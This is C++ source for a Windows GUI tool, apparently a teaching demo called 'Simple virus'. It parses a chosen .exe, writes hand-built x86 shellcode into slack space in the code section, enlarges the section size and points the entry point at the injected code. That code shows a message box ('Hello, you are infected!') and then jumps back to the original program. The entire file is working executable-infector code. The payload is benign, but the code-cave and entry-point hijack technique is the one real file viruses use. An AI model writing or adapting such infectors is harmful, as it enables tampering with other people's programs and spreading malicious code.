#define _CRT_SECURE_NO_WARNINGS

#include "resource.h"
#include "helper.h"
#include <utility>
#include <cstdio>
#include <cmath>
#include <Shlwapi.h>

using std::pair;
using std::make_pair;

enum IOException {
        kIOException
};

enum FileMapException {
        kFileMapException
};


namespace {

class PEParser {
public:
        enum Alignment {
                Section,
                File
        };

        typedef bool (*EnumLibraryCallback)(const char* lib_name, void* arg);

        typedef bool (*EnumSectionTableCallback)(IMAGE_SECTION_HEADER* header,
                                                 void* arg);

        typedef bool (*EnumFunctionCallback)(const char* lib_name,
                                             const char* func_name,
                                             DWORD rva_of_func,
                                             void* arg);

        typedef bool (*EnumLibraryExCallback)(PEParser* parser,
                                              IMAGE_IMPORT_DESCRIPTOR* descriptor,
                                              void* arg);

        PEParser(const TCHAR* file_path);
        ~PEParser();
                
        DWORD EntryPoint();
        DWORD ImageBase();
        WORD NumberOfSections();
        DWORD GetAlignments(Alignment alignment);

        DWORD FileOffsetOfLastSection();
        DWORD FileOffsetOfSectionTable();
        DWORD FileOffsetOfImportTable();
        DWORD FileOffsetOfEntryPoint();
        DWORD FileOffsetOfCodeVirtualSize();

        void EnumImportLibrarys(EnumLibraryCallback callback, void* arg);
        void EnumSectionTable(EnumSectionTableCallback callback, void* arg);
        void EnumImportFunctions(EnumFunctionCallback callback, void* arg);
        void EnumImportLibrarysEx(EnumLibraryExCallback callback, void* arg);

private:
        static bool FindFunctions(PEParser* parser,
                                  IMAGE_IMPORT_DESCRIPTOR* descriptor,
                                  void* arg);

        DWORD RVAToFileOffset(DWORD rva);
        DWORD RVAOfImportTable();

        HANDLE file_;
        HANDLE map_;
        char* image_base_;
        
        IMAGE_NT_HEADERS* nt_header_base_;         // Structure of PE header
        IMAGE_SECTION_HEADER* section_table_base_; // Structure of section header
        const TCHAR* file_path_;
};


//-------------------------------------------------
//         Helper functions for PEParser
//-------------------------------------------------
bool IsCodeSection(IMAGE_SECTION_HEADER* header)
{
        char* name = reinterpret_cast<char*>(header->Name);

        if (0 == lstrcmpiA(name, ".text") || 0 == lstrcmpiA(name, "code"))
                return true;
        else
                return false;
}

bool PrintImportLibrary(const char* lib_name, void*)
{
        printf("%s\n", lib_name);
        return true;
}

bool PrintImportFunction(const char* lib_name,
                         const char* func_name,
                         DWORD rva_of_func,
                         void*)
{
        puts(lib_name);
        printf("\t%x %s\n", rva_of_func, func_name);
        
        return true;
}

bool FindCodeSectionSpace(IMAGE_SECTION_HEADER* header, void* arg)
{
        if (IsCodeSection(header)) {
                // Find the code section, a normal PE file should have
                // such a section
                DWORD file_size = header->SizeOfRawData;
                DWORD real_size = header->Misc.VirtualSize;
                DWORD* space    = reinterpret_cast<DWORD*>(arg);
                
                if (file_size > real_size) {
                        *space = file_size - real_size;
                } else {
                        // This should not happen for normal PE file.
                        puts("Real size bigger than physical size in code section!");
                        *space = 0;
                }

                return false;
        } else {
                return true;
        }
}

bool FindFileOffsetCodeSectionSpace(IMAGE_SECTION_HEADER* header, void* arg)
{
        if (IsCodeSection(header)) {
                // Find the code section, a normal PE file should have
                // such a section
                DWORD section_offset = header->PointerToRawData;
                DWORD file_size      = header->SizeOfRawData;
                DWORD real_size      = header->Misc.VirtualSize;
                DWORD* offset        = reinterpret_cast<DWORD*>(arg);
                
                if (file_size > real_size) {
                        *offset = section_offset + real_size;
                } else {
                        // This should not happen for normal PE file.
                        puts("Real size bigger than physical size in code section!");
                        *offset = 0;
                }

                return false;
        } else {
                return true;
        }
}

bool FindCodeSectionEnd(IMAGE_SECTION_HEADER* header, void* arg)
{
        if (IsCodeSection(header)) {
                DWORD* rva = reinterpret_cast<DWORD*>(arg);

                *rva = header->VirtualAddress + header->Misc.VirtualSize;

                return false;
        } else {
                return true;
        }
}

DWORD SpaceOfCodeSection(PEParser* parser)
{
        DWORD space = 0;

        parser->EnumSectionTable(FindCodeSectionSpace, &space);
        return space;
}

DWORD FileOffsetOfCodeSectionSpace(PEParser* parser)
{
        DWORD offset = 0;
        
        parser->EnumSectionTable(FindFileOffsetCodeSectionSpace, &offset);
        return offset;
}

DWORD RVAOfCodeSectionEnd(PEParser* parser)
{
        DWORD ret = 0;

        parser->EnumSectionTable(FindCodeSectionEnd, &ret);
        return ret;
}


//-------------------------------------------------
//        Core functions for Infecting PE
//-------------------------------------------------
size_t MakeShellCode(PEParser* parser,
                     unsigned char* buf,
                     size_t buf_size,
                     const char* text,
                     const char* caption)
{
        // mov eax, someaddr
        // call eax
        // This is a useful pattern for shell code because we can save the
        // address of any windows API we want to eax and jump to it directly.
        // If use another call pattern, for example "call someaddr"
        // the someaddr is not the address of an API but the offset of the
        // current instruction and need additional computation.
        unsigned char shell_code[] = {
                0x6a, 0x00,                     // push box type value
                0x68, 0x00, 0x00, 0x00, 0x00,   // push caption address
                0x68, 0x00, 0x00, 0x00, 0x00,   // push text address
                0x6a, 0x00,                     // push window handle value
                0xb8, 0x00, 0x00, 0x00, 0x00,   // mov  eax, 0x00000000(for MessageBoxA address)
                0xff, 0xd0,                     // call eax
                0xe9, 0x00, 0x00, 0x00, 0x00    // jump back to host program
        };
        
        size_t text_len  = strlen(text);
        size_t cap_len   = strlen(caption);
        size_t code_size = sizeof(shell_code) +
                           text_len +
                           cap_len +
                           2;   // null terminator for the ascii strings

        if (code_size > buf_size) return 0;
        
        HMODULE module = LoadLibraryA("user32.dll");

        if (!module) {
                PrintErrorWith(_T("Load user32.dll fail!\n"));
                return 0;
        }

        FARPROC proc = GetProcAddress(module, "MessageBoxA");
        if (!proc) {
                FreeLibrary(module);
                PrintErrorWith(_T("Get MessageBoxA address fail!\n"));
                return 0;
        }

        DWORD rva_of_code_space = parser->ImageBase() + 
                                  RVAOfCodeSectionEnd(parser);
        // Fill address for caption
        DWORD addr = rva_of_code_space + sizeof(shell_code);
        memcpy(&shell_code[3], &addr, 4);
        
        // Fill address for text
        addr = addr + cap_len + 1;
        memcpy(&shell_code[8], &addr, 4);

        // We can use the address of MessageBoxA of our process directly
        // because the user32.dll is a system dll and is a little different.
        // Windows adjust the desired base address for it so it usually
        // loaded to the same address for almost every process and the
        // APIs in the dll will have the same address for those process.
        addr = reinterpret_cast<DWORD>(proc);
        memcpy(&shell_code[15], &addr, 4);
        
        // Compute the relative address for jmp instruction to OEP.
        addr = parser->ImageBase() +
               parser->EntryPoint() -
               (rva_of_code_space + 21) - 5;

        memcpy(&shell_code[22], &addr, 4);

        memcpy(buf, shell_code, sizeof(shell_code));
        // Plus 1 for coping null terminator
        memcpy(&buf[sizeof(shell_code)], caption, cap_len + 1);
        memcpy(&buf[sizeof(shell_code) + cap_len + 1], text, text_len + 1);

        return code_size;
}

bool AddMsgBoxToPE(HWND window,
                   const TCHAR* file,
                   const char* text,
                   const char* caption)
{
        unsigned char code_buf[512]    = {};
        size_t shell_code_size         = 0;
        DWORD oep_offset               = 0;
        DWORD new_oep                  = 0;
        DWORD code_space_offset        = 0;
        DWORD code_virtual_size_offset = 0;

        try {
                PEParser parser(file);

                shell_code_size = MakeShellCode(&parser,
                                                code_buf,
                                                sizeof(code_buf),
                                                text,
                                                caption);
                if (0 == shell_code_size) {
                        MessageBoxA(window,
                                    "Buffer for shell code is too small",
                                    "Internal Error",
                                    MB_ICONERROR);
                        return false;
                }
                
                // Check if the host program have enough space to inject codes.
                if (SpaceOfCodeSection(&parser) < shell_code_size) {
                        MessageBoxA(window,
                                    "There is no enough space to inject codes",
                                    "Error",
                                    MB_ICONERROR);
                        return false;
                }
                
                oep_offset        = parser.FileOffsetOfEntryPoint();
                new_oep           = RVAOfCodeSectionEnd(&parser);
                code_space_offset = FileOffsetOfCodeSectionSpace(&parser);
                code_virtual_size_offset = parser.FileOffsetOfCodeVirtualSize();
        } catch (IOException) {
                MessageBoxA(window,
                            "Open file fail, maybe the program is currently running",
                            "Error",
                            MB_ICONERROR);
                return false;
        } catch (FileMapException) {
                MessageBoxA(window, 
                            "Map file fail, maybe some other application "
                            "is opening the program currently,\nor the file "
                            "is not a correct executable.",
                            "Error",
                            MB_ICONERROR);
                return false;
        }

        // The needed informations are ready, start to inject codes to the PE
        // file.
        FILE* f = _tfopen(file, _T("r+b"));

        if (!f) {
                MessageBoxA(window,
                            "Open file fail, maybe the program is currently running",
                            "Error",
                            MB_ICONERROR);
                return false;
        }
        
        // Change OEP
        fseek(f, oep_offset, SEEK_SET);
        fwrite(&new_oep, sizeof(new_oep), 1, f);

        // Change virtual size of code section
        DWORD old_code_size = 0;

        fseek(f, code_virtual_size_offset, SEEK_SET);
        fread(&old_code_size, sizeof(old_code_size), 1, f);

        DWORD new_code_size = old_code_size + shell_code_size;

        fseek(f, code_virtual_size_offset, SEEK_SET);
        fwrite(&new_code_size, sizeof(new_code_size), 1, f);

        // Inject shell code
        fseek(f, code_space_offset, SEEK_SET);
        fwrite(code_buf, shell_code_size, 1, f);

        fclose(f);

        return true;
}


//-------------------------------------------------
//       Functions for handling UI events
//-------------------------------------------------
bool StringPrintable(const char* str)
{
        int len = strlen(str);

        for (int i = 0; i < len; i++) {
                // The isprint function use assert to check if the argument
                // is less than 255 in debug build.
                // We check it first to avoid abort within isprint for
                // debug build.
                if (static_cast<unsigned>(str[i]) > 255)
                        return false;

                if (!isprint(str[i]))
                        return false;
        }

        return true;
}

BOOL HandleWmCommand(HWND dialog, WPARAM wParam)
{
        TCHAR text[MAX_PATH]        = {};
        TCHAR select_file[MAX_PATH] = {};
        bool result                 = false;
        HWND button                 = NULL;
        TCHAR* ext                  = NULL;
        char box_text[128]          = {};
        char box_caption[128]       = {};
        const char* default_text    = "Hello, you are infected!";
        const char* default_caption = "Simple virus";

        // Use low-word part, because the high-word part of keyboard accelerator
        // and menu are 1 and 0 respectively.
        switch (LOWORD(wParam)) {
        case IDC_SELECTFILE:
        case IDM_OPEN1:
                result = GetOpenFileNameByFilter(dialog,
                                                 _T("All\0*.*\0"),
                                                 NULL,
                                                 NULL,
                                                 select_file,
                                                 _countof(select_file));
                if (result)
                        SetDlgItemText(dialog, IDC_FILEPATH, select_file);
                break;
        case IDCANCEL:
        case IDM_CLOSE2:
                if (!DestroyWindow(dialog))
                        PopupError();

                PostQuitMessage(0);
                return TRUE;
        case IDSTART:
                button = GetDlgItem(dialog, IDC_FILEPATH);
                EnableWindow(button, FALSE);

                GetDlgItemText(dialog, IDC_FILEPATH, text, _countof(text));
                
                // Since user can type the path manually, so we need to
                // check if the file exists first.
                if (!PathFileExists(text)) {
                        EnableWindow(button, TRUE);
                        break;
                }
                
                ext = PathFindExtension(text);
                if (0 != lstrcmpi(ext, _T(".exe"))) {
                        MessageBoxA(dialog,
                                    "Please select an exe file.",
                                    "Warning",
                                    MB_ICONWARNING);
                        EnableWindow(button, TRUE);
                        break;
                }

                GetDlgItemTextA(dialog, IDC_BOXTEXT, box_text, _countof(box_text));
                GetDlgItemTextA(dialog, IDC_BOXCAPTION, box_caption, _countof(box_caption));
                
                if (!StringPrintable(box_text) || !StringPrintable(box_caption)) {
                        MessageBoxA(dialog,
                                    "Please input printable string.",
                                    "Warning",
                                    MB_ICONWARNING);
                        EnableWindow(button, TRUE);
                        break;
                }

                if (0 == strlen(box_text) && 0 == strlen(box_caption))
                        result = AddMsgBoxToPE(dialog, text, default_text, default_caption);
                else if (0 == strlen(box_text))
                        result = AddMsgBoxToPE(dialog, text, default_text, box_caption);
                else if (0 == strlen(box_caption))
                        result = AddMsgBoxToPE(dialog, text, box_text, default_caption);
                else
                        result = AddMsgBoxToPE(dialog, text, box_text, box_caption);
                
                if (result)
                        MessageBoxA(dialog, "File infected finish!", "Success", MB_OK);

                EnableWindow(button, TRUE);
                break;
        case IDM_ABOUT:
                MessageBoxA(dialog,
                            "This program can inject the shell code\n"
                            "that opens a message box to a PE file.\n",
                            "About",
                            MB_OK);
                break;
        default:
                ;
        }

        return FALSE;
}

INT_PTR CALLBACK DialogProc(HWND dialog, UINT uMsg, WPARAM wParam, LPARAM)
{
        HDROP drop     = NULL;
        UINT num_files = 0;

        switch (uMsg) {
        case WM_COMMAND:
                return HandleWmCommand(dialog, wParam);
        case WM_DROPFILES:
                drop      = reinterpret_cast<HDROP>(wParam);
                num_files = DragQueryFile(drop, 0xFFFFFFFF, NULL, 0);

                for (UINT i = 0; i < num_files; i++) {
                        TCHAR buf[MAX_PATH] = {};

                        if (0 != DragQueryFile(drop, i, buf, _countof(buf))) {
                                // If user drop a directory then we should
                                // do nothing.
                                // And if user drop multiple files, we use
                                // the first valid file.
                                if (!PathIsDirectory(buf)) {
                                        SetDlgItemText(dialog, IDC_FILEPATH, buf);
                                        break;
                                }
                        } else {
                                PopupError();
                        }
                }

                DragFinish(drop);
                break;
        default:
                ;
        }

        return FALSE;
}


}       // End of unnamed namespace


//-------------------------------------------------
//               PEParser implement
//-------------------------------------------------
PEParser::PEParser(const TCHAR* file_path)
        : file_path_(file_path)
        , nt_header_base_(NULL)
        , section_table_base_(NULL)
{
        file_ = CreateFile(file_path_,
                           GENERIC_READ,
                           FILE_SHARE_READ,
                           NULL,
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
        if (!file_)
                throw kIOException;
        
        // Use the SEC_IMAGE flag, this API will map the file as an executable
        // file and it will check is the file a valid PE file.
        // We don't need to check the validation anymore.
        map_ = CreateFileMapping(file_,
                                 NULL,
                                 PAGE_READONLY | SEC_IMAGE,
                                 0,
                                 0,
                                 NULL);
        if (!map_) {
                CloseHandle(file_);
                throw kFileMapException;
        }

        image_base_ =
                reinterpret_cast<char*>(
                        MapViewOfFile(map_, FILE_MAP_READ, 0, 0, 0));

        if (!image_base_) {
                CloseHandle(file_);
                CloseHandle(map_);
                throw kFileMapException;
        }

        // Structure of DOS header
        IMAGE_DOS_HEADER* dos_header =
                reinterpret_cast<IMAGE_DOS_HEADER*>(image_base_);
        
        // Get base address of PE header
        nt_header_base_ = 
                reinterpret_cast<IMAGE_NT_HEADERS*>(
                        image_base_ + dos_header->e_lfanew);
        
        char* optional_header_base =
                reinterpret_cast<char*>(&nt_header_base_->OptionalHeader);

        // Get base address of section table
        section_table_base_ = reinterpret_cast<IMAGE_SECTION_HEADER*>(
                optional_header_base +
                nt_header_base_->FileHeader.SizeOfOptionalHeader);
}

PEParser::~PEParser()
{
        UnmapViewOfFile(image_base_);
        CloseHandle(map_);
        CloseHandle(file_);
}

DWORD PEParser::EntryPoint()
{
        return nt_header_base_->OptionalHeader.AddressOfEntryPoint;
}

WORD PEParser::NumberOfSections()
{
        return nt_header_base_->FileHeader.NumberOfSections;
}

DWORD PEParser::FileOffsetOfLastSection()
{
        IMAGE_SECTION_HEADER* section_header = section_table_base_;

        DWORD ret          = 0;
        DWORD num_sections = nt_header_base_->FileHeader.NumberOfSections;

        for (DWORD i = 0; i < num_sections; i++) {
                DWORD offset = section_header->PointerToRawData;

                if (offset > ret)
                        ret = offset;

                ++section_header;
        }
        
        puts("PEParser: Can't find file offset for last section!"); 
        return 0;
}

DWORD PEParser::GetAlignments(Alignment alignment)
{
        switch (alignment) {
        case Section:
                return nt_header_base_->OptionalHeader.SectionAlignment;
        case File:
                return nt_header_base_->OptionalHeader.FileAlignment;
        default:
                return 0;
        }
}

DWORD PEParser::ImageBase()
{
        return nt_header_base_->OptionalHeader.ImageBase;
}

DWORD PEParser::FileOffsetOfSectionTable()
{
        char* offset = reinterpret_cast<char*>(section_table_base_) - 
                       reinterpret_cast<unsigned int>(image_base_);

        return reinterpret_cast<DWORD>(offset);
}

DWORD PEParser::FileOffsetOfImportTable()
{
        return RVAToFileOffset(RVAOfImportTable());
}

DWORD PEParser::FileOffsetOfEntryPoint()
{
        DWORD addr_of_oep = reinterpret_cast<DWORD>(
                &nt_header_base_->OptionalHeader.AddressOfEntryPoint);
        
        return addr_of_oep - reinterpret_cast<DWORD>(image_base_);
}

DWORD PEParser::RVAToFileOffset(DWORD rva)
{
        IMAGE_SECTION_HEADER* section_header = section_table_base_;

        DWORD num_sections = nt_header_base_->FileHeader.NumberOfSections;
        DWORD i            = 0;

        for (; i < num_sections; i++) {
                // Find at which section the RVA is
                if (rva >= section_header->VirtualAddress &&
                    rva <= section_header->VirtualAddress + section_header->Misc.VirtualSize)
                        break;

                ++section_header;
        }

        if (i < num_sections) {
                return rva - section_header->VirtualAddress + section_header->PointerToRawData;
        } else {
                printf("PEParser: Can't find section for RVA=0x%x\n", rva);
                return 0;       // This should not happen
        }
}

void PEParser::EnumImportLibrarys(EnumLibraryCallback callback, void* arg)
{
        IMAGE_IMPORT_DESCRIPTOR* descriptor = 
                reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
                        image_base_ + RVAOfImportTable());
        
        IMAGE_IMPORT_DESCRIPTOR empty_elm = {};

        for (;;) {
                // The last element of IMAGE_IMPORT_DESCRIPTOR array is an all
                // zero element.
                if (0 == memcmp(descriptor, &empty_elm, sizeof(empty_elm))) break;
                
                const char* lib_name = reinterpret_cast<const char*>(
                        image_base_ + descriptor->Name);
                
                if (!callback(lib_name, arg))
                        break;

                ++descriptor;
        }
}

DWORD PEParser::RVAOfImportTable()
{
        IMAGE_OPTIONAL_HEADER* header = &nt_header_base_->OptionalHeader;

        IMAGE_DATA_DIRECTORY import_data =
                header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

        return import_data.VirtualAddress;
}

void PEParser::EnumSectionTable(EnumSectionTableCallback callback, void* arg)
{
        IMAGE_SECTION_HEADER* section_header = section_table_base_;

        DWORD num_sections = nt_header_base_->FileHeader.NumberOfSections;

        for (DWORD i = 0; i < num_sections; i++) {
                if (!callback(section_header, arg)) break;
                                       
                ++section_header;
        }
}

void PEParser::EnumImportLibrarysEx(EnumLibraryExCallback callback, void* arg)
{
        IMAGE_IMPORT_DESCRIPTOR* descriptor = 
                reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
                        image_base_ + RVAOfImportTable());
        
        IMAGE_IMPORT_DESCRIPTOR empty_elm = {};

        for (;;) {
                // The last element of IMAGE_IMPORT_DESCRIPTOR array is an all
                // zero element.
                if (0 == memcmp(descriptor, &empty_elm, sizeof(empty_elm))) break;
                
                if (!callback(this, descriptor, arg))
                        break;

                ++descriptor;
        }
}

void PEParser::EnumImportFunctions(EnumFunctionCallback callback, void* arg)
{
        pair<EnumFunctionCallback, void*> arg2 = make_pair(callback, arg);

        EnumImportLibrarysEx(FindFunctions, &arg2);
}

bool PEParser::FindFunctions(PEParser* parser,
                             IMAGE_IMPORT_DESCRIPTOR* descriptor,
                             void* arg)
{
        pair<EnumFunctionCallback, void*>* arg2 =
                reinterpret_cast<pair<EnumFunctionCallback, void*>*>(arg);
        
        IMAGE_THUNK_DATA* addr_thunk = 
                reinterpret_cast<IMAGE_THUNK_DATA*>(
                        parser->image_base_ + descriptor->FirstThunk);

        IMAGE_THUNK_DATA* name_thunk =
                reinterpret_cast<IMAGE_THUNK_DATA*>(
                        parser->image_base_ + descriptor->OriginalFirstThunk);

        const char* lib_name       = parser->image_base_ + descriptor->Name;
        IMAGE_THUNK_DATA empty_elm = {};

        for (;;) {
                // The last element of IMAGE_THUNK_DATA array is an all zero
                // element
                if (0 == memcmp(name_thunk, &empty_elm, sizeof(name_thunk)))
                        break;

                IMAGE_IMPORT_BY_NAME* name_data =
                        reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                                parser->image_base_ +
                                name_thunk->u1.Function);

                const char* func_name = reinterpret_cast<const char*>(name_data->Name);

                DWORD rva_of_func = addr_thunk->u1.Function;
                
                // If the client wants to exit the enumeration, just return
                // immediately
                if (!arg2->first(lib_name, func_name, rva_of_func, arg2->second))
                        return false;

                ++addr_thunk;
                ++name_thunk;
        }

        return true;
}

DWORD PEParser::FileOffsetOfCodeVirtualSize()
{
        IMAGE_SECTION_HEADER* section_header = section_table_base_;

        DWORD num_sections = nt_header_base_->FileHeader.NumberOfSections;

        for (DWORD i = 0; i < num_sections; i++) {
                if (IsCodeSection(section_header)) {
                        DWORD addr = reinterpret_cast<DWORD>(
                                &section_header->Misc.VirtualSize);
                        
                        return addr - reinterpret_cast<DWORD>(image_base_);
                }

                ++section_header;
        }

        return 0;
}


//-------------------------------------------------
//        Entry point of Simple virus demo
//-------------------------------------------------
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
        HINSTANCE instance = GetModuleHandle(NULL);
        HWND dialog        = CreateDialog(instance, MAKEINTRESOURCE(IDD_DIALOG4), NULL, DialogProc);
        HACCEL accelerator = LoadAccelerators(instance, MAKEINTRESOURCE(IDR_ACCELERATOR1));

        if (!dialog || !accelerator) {
                PopupError();
                return EXIT_FAILURE;
        }

        BOOL ret;
        MSG  msg = {};

        while ((ret = GetMessage(&msg, NULL, 0, 0)) != 0) {
                if (ret == -1) {
                        PopupError();
                        break;
                }
                
                // Need to translate accelerator for hot key
                if (TranslateAccelerator(dialog, accelerator, &msg))
                        continue;
 
                if (IsDialogMessage(dialog, &msg))
                        continue;

                TranslateMessage(&msg); 
                DispatchMessage(&msg); 
        }

        return 0;
}
